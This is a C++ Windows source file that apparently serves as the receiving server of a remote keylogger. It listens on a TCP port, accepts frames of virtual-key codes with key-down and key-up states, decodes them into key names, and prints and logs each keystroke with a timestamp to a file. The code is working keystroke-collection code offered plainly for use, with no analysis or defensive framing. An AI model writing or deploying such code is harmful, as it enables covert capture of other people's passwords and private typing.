#include <time.h>
#include <stdio.h>
#include <winsock2.h> 
#include <queue>
#define RECV_SIZE 6//禁止修改
#define SEND_SIZE 32//根据情况修改
#define PORT 35924//根据情况修改
#define sleep(x) this_thread::sleep_for(chrono::milliseconds(x))
using namespace std;

int client_addr_len;
WORD winsock_version;
WSADATA wsa_data;
SOCKET server_socket,client_socket;
struct sockaddr_in server_addr,client_addr;
FILE *fout;
time_t rawtime;

void print(const char *str){printf("[% *.3f] %s\n",10,(double)clock()/1000,str);}
void print(const char *str1,const char *str2){printf("[% *.3f] %s%s\n",10,(double)clock()/1000,str1,str2);}
char *get_time(){
	time(&rawtime);
	char *str=ctime(&rawtime);
	str[strlen(str)-1]=0;
	return str;
}
void init(){
	fout=fopen("log.out","a+");
	if(fout==NULL)print("Failed to open file!"),exit(1);
	fprintf(fout,"\nServer Log Started at %s.\n",get_time());
	winsock_version=MAKEWORD(2,2);
	if(WSAStartup(winsock_version,&wsa_data)!=0)print("Failed to init socket dll!"),exit(1);
	server_socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(server_socket==INVALID_SOCKET)print("Failed to create server socket!"),exit(1);
	server_addr.sin_family=AF_INET;
	server_addr.sin_port=htons(PORT);
	server_addr.sin_addr.S_un.S_addr=INADDR_ANY;
	if(bind(server_socket,(LPSOCKADDR)&server_addr,sizeof(server_addr))==SOCKET_ERROR)print("Failed to bind port!"),exit(1);
	if(listen(server_socket,10))print("Failed to listen!"),exit(1);
	client_addr_len=sizeof(client_addr);
	print("Waiting for connecting...");
	client_socket=accept(server_socket,(SOCKADDR*)&client_addr,&client_addr_len);
	if(client_socket==INVALID_SOCKET)print("Failed to accept!"),exit(1);
	print("Succeeded to receive a connection: ",inet_ntoa(client_addr.sin_addr));
}
void translate(int key,bool state){
	double t=(double)clock()/1000;
	printf("[% *.3f] ",10,t);
	fprintf(fout,"[% *s]-[% *.3f]  ",25,get_time(),10,t);
	if(key>=48&&key<=57)printf("%c",'0'+key-48),fprintf(fout,"%c",'0'+key-48);
	else if(key>=65&&key<=90)printf("%c",'A'+key-65),fprintf(fout,"%c",'A'+key-65);
	else if(key>=96&&key<=105)printf("%c",'0'+key-96),fprintf(fout,"%c",'0'+key-96);
	else if(key==106)printf("NUM *"),fprintf(fout,"NUM *");
	else if(key==107)printf("NUM +"),fprintf(fout,"NUM +");
	else if(key==109)printf("NUM -"),fprintf(fout,"NUM -");
	else if(key==110)printf("NUM ."),fprintf(fout,"NUM .");
	else if(key==111)printf("NUM /"),fprintf(fout,"NUM /");
	else if(key>=112&&key<=123)printf("F%d",key-111),fprintf(fout,"F%d",key-111);
	else if(key==8)printf("Backspace"),fprintf(fout,"Backspace");
	else if(key==9)printf("Tab"),fprintf(fout,"Tab");
	else if(key==13)printf("Enter"),fprintf(fout,"Enter");
	else if(key==16||key==160||key==161)printf("Shift"),fprintf(fout,"Shift");
	else if(key==17||key==162||key==163)printf("Ctrl"),fprintf(fout,"Ctrl");
	else if(key==18||key==164||key==165)printf("Alt"),fprintf(fout,"Alt");
	else if(key==20)printf("CapsLock"),fprintf(fout,"CapsLock");
	else if(key==27)printf("Escape"),fprintf(fout,"Escape");
	else if(key==32)printf("Space"),fprintf(fout,"Space");
	else if(key==33)printf("PageUp"),fprintf(fout,"PageUp");
	else if(key==34)printf("PageDown"),fprintf(fout,"PageDown");
	else if(key==35)printf("End"),fprintf(fout,"End");
	else if(key==36)printf("Home"),fprintf(fout,"Home");
	else if(key==37)printf("LeftArrow"),fprintf(fout,"LeftArrow");
	else if(key==38)printf("UpArrow"),fprintf(fout,"UpArrow");
	else if(key==39)printf("RightArrow"),fprintf(fout,"RightArrow");
	else if(key==40)printf("DownArrow"),fprintf(fout,"DownArrow");
	else if(key==45)printf("Insert"),fprintf(fout,"Insert");
	else if(key==46)printf("Delete"),fprintf(fout,"Delete");
	else if(key==91||key==92)printf("Win"),fprintf(fout,"Win");
	else if(key==144)printf("NumLock"),fprintf(fout,"NumLock");
	else if(key==186)printf(";:"),fprintf(fout,";:");
	else if(key==187)printf("=+"),fprintf(fout,"=+");
	else if(key==188)printf(",<"),fprintf(fout,",<");
	else if(key==189)printf("-_"),fprintf(fout,"-_");
	else if(key==190)printf(".>"),fprintf(fout,".>");
	else if(key==191)printf("/?"),fprintf(fout,"/?");
	else if(key==192)printf("`~"),fprintf(fout,"`~");
	else if(key==219)printf("[{"),fprintf(fout,"[{");
	else if(key==220)printf("\\|"),fprintf(fout,"\\|");
	else if(key==221)printf("]}"),fprintf(fout,"]}");
	else if(key==222)printf("'\""),fprintf(fout,"'\"");
	else printf("Unknown"),fprintf(fout,"Unknown");
	if(state)printf(" Down\n"),fprintf(fout,"  Down\n");
	else printf(" Up\n"),fprintf(fout,"  Up\n");
}
void response(){
	if(send(client_socket,"Keep connection!",16,0)<0)print("Failed to respond client!");
	else print("Response to client: Keep connection!");
}
void auto_recv(){
	queue<char>recv_queue;
	char recv_data[RECV_SIZE+1],recv_buf[RECV_SIZE*128+1];
	while(1){
		int len=recv(client_socket,recv_buf,RECV_SIZE*128,0);
		if(len<0){
			print("Failed to receive data! Client may close the connection.");
			return;
		}
		if(len==0||len%RECV_SIZE!=0)print("Received data damaged! Skipping!");
		else{
			for(int i=0;i<len;i++)recv_queue.push(recv_buf[i]);
			while(recv_queue.size()){
				for(int i=0;i<RECV_SIZE;i++)recv_data[i]=recv_queue.front(),recv_queue.pop();
				if(recv_data[5]!='p')print("Failed to process frame! Skipping!");
				else if(recv_data[0]=='a')print("Processing: ",recv_data),response();
				else{
					print("Processing: ",recv_data);
					char *c=recv_data;int key_val=0;
					while(isdigit(*c))key_val=key_val*10+(*c&15),c++;
					translate(key_val,recv_data[4]=='1');
				}
			}
		}
	}
}
int main(){
	init();
	auto_recv();
	closesocket(client_socket);
	closesocket(server_socket);
	WSACleanup();
	fclose(fout);
	system("Pause");
	return 0;
}
